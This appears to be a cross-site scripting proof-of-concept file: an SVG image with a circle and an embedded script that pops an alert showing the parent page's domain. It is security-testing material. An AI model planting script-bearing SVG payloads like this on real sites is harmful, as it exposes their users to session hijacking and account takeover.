<?xml version="1.0" encoding="UTF-8"?>  
<svg xmlns="http://www.w3.org/2000/svg"  
    version="1.1" baseProfile="full"  
    width="700px" height="400px" viewBox="0 0 700 400">  
   <circle cx="125" cy="125" r="75" />  
   <script type="text/javascript">  
    alert(window.parent.document.domain)  
   </script>  
</svg>  
